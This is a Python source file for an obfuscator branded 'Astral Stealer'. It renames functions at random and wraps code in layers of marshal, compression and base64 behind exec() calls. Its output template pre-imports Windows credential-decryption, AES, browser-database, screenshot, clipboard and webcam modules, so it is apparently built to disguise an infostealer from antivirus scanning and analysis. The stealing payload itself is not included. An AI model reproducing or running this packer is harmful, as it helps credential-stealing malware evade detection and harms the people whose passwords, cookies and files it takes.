#Modified by xTyzenIV
import os
import sys
import subprocess
import argparse
import random
import time
import marshal
import lzma
import gzip
import bz2
import binascii
import zlib
import string
import re
import keyword
#Modified by xTyzenIV
try:
    import tqdm
    import colorama
    import pyfiglet
except ImportError:
    if os.name == 'nt':
        _ = 'python'
    else:
        _ = 'python' + '.'.join(str(i) for i in sys.version_info[:2])
    if subprocess.run([_, '-m', 'pip', 'install', '-r', 'requirements.txt']).returncode == 0:
        exit('\x1b[1m\x1b[92m[+] dependencies installed\nrun the program again')
    elif subprocess.run(['pip3', 'install', '-r', 'requirements.txt']).returncode == 0:
        exit('\x1b[1m\x1b[92m[+] dependencies installed\nrun the program again')
    else:
        exit('\x1b[1m\x1b[31m[!] something error occured while installing dependencies\n maybe pip isn\'t installed or requirements.txt file not available?')

BLU = colorama.Style.BRIGHT + colorama.Fore.BLUE
CYA = colorama.Style.BRIGHT + colorama.Fore.CYAN
GRE = colorama.Style.BRIGHT + colorama.Fore.GREEN
YEL = colorama.Style.BRIGHT + colorama.Fore.YELLOW
RED = colorama.Style.BRIGHT + colorama.Fore.RED
MAG = colorama.Style.BRIGHT + colorama.Fore.MAGENTA
LIYEL = colorama.Style.BRIGHT + colorama.Fore.LIGHTYELLOW_EX
LIRED = colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX
LIMAG = colorama.Style.BRIGHT + colorama.Fore.LIGHTMAGENTA_EX
LIBLU = colorama.Style.BRIGHT + colorama.Fore.LIGHTBLUE_EX
LICYA = colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX
LIGRE = colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX
CLEAR = 'cls' if os.name == 'nt' else 'clear'
COLORS = BLU, CYA, GRE, YEL, RED, MAG, LIYEL, LIRED, LIMAG, LIBLU, LICYA, LIGRE
FONTS = 'basic', 'o8', 'cosmic', 'graffiti', 'chunky', 'epic', 'poison', 'doom', 'avatar'
PYTHON_VERSION = 'python' + '.'.join(str(i) for i in sys.version_info[:2])
colorama.init(autoreset=True)


def gnrt_rndm_nm():
    length = random.randint(8, 15)
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def is_vld_idf(name):
    return name.isidentifier() and not keyword.iskeyword(name)


def obfsct_cde(src_code, whitelist):
    func_names = set(re.findall(r'def\s+(\w+)', src_code))
    usr_func_names = [name for name in func_names if is_vld_idf(name) and name not in whitelist]

    for func_name in usr_func_names:
        new_name = gnrt_rndm_nm()
        src_code = re.sub(r'\b{}\b'.format(func_name), new_name, src_code)
    obfsctd_code = src_code

    return obfsctd_code


def ncde(src):
    selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))
    marshal_encoded = marshal.dumps(compile(src, 'AstralStealer', 'exec'))
    if selected_mode is binascii:
        encoded = binascii.b2a_base64(marshal_encoded)
    else:
        encoded = selected_mode.compress(marshal_encoded)
    if selected_mode is binascii:
        return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64({})))'.format(encoded)
    else:
        return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads({}.decompress({})))'.format(selected_mode.__name__, encoded)


def lg():
    os.system(CLEAR)
    font = random.choice(FONTS)
    color1 = random.choice(COLORS)
    color2 = random.choice(COLORS)
    while color1 == color2:
        color2 = random.choice(COLORS)
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)
    print(color2 + pyfiglet.figlet_format(
        'Astral\nStealer',
        font=font,
        justify='center',
        width=os.get_terminal_size().columns),
        end=''
        )
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)


def parse_args():
    parser = argparse.ArgumentParser(description='obfuscate python programs')
    parser._optionals.title = "syntax"
    parser.add_argument(
        '-r','--recursion',
        default=False,
        required=False,
        help="recursion encoding by using this flag you will get x2 obfuscation strength",
        dest='r',
        action='store_true')
    parser.add_argument('-i', '--input', type=str, help='input file name', required=True)
    parser.add_argument('-o', '--output', type=str, help='output file name', required=True)
    parser.add_argument('-s', '--strength', type=int,
                        help='strengthness of obfuscation. 100 recommended', required=True)
    if len(sys.argv)==1:
        parser.print_help()
        exit()
    return parser.parse_args()


def mn():
    args = parse_args()
    print(random.choice(COLORS) + '\t[+] encoding ' + args.input)
    if not(args.r):
        print(random.choice(COLORS) + '\t[!] you haven\'t selected the recursion mode')
    with tqdm.tqdm(total=args.strength) as pbar:
        with open(args.input) as input:
            whitelist = ['decode', 'run', 'start', 'replace', 'encode', '__main__', '__init__']
            input1 = obfsct_cde(input.read(), whitelist)
            if args.r:
                for i in range(args.strength):
                    if i == 0:
                        encoded = ncde(src=input1)
                    else:
                        encoded = ncde(src=ncde(src=encoded))
                    time.sleep(0.1)
                    pbar.update(1)
            else:
                for i in range(args.strength):
                    if i == 0:
                        encoded = ncde(src=input1)
                    else:
                        encoded = ncde(src=encoded)
                    time.sleep(0.1)
                    pbar.update(1)
    with open(args.output, 'w') as output:
        output.write(f"import asyncio, sys, json, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, base64, requests, ctypes, time, pyperclip, locale, win32gui, win32con, win32api, win32process, cv2;from urllib.parse import urlparse;from configparser import ConfigParser;from tempfile import gettempdir, mkdtemp;from base64 import b64decode;from datetime import datetime, timedelta, timezone;from sys import argv;from ctypes import c_char_p, c_int, c_uint32, c_void_p, c_uint;from Crypto.Cipher import AES;from win32crypt import CryptUnprotectData;from subprocess import CREATE_NEW_CONSOLE, Popen, PIPE;from PIL import ImageGrab\n\ntry:\n\t{encoded}\nexcept KeyboardInterrupt:\n\tpass"
)
    print(LIGRE + '\t[+] encoding successful!\n\tsaved as ' + args.output)


if __name__ == '__main__':
    lg()
    mn()
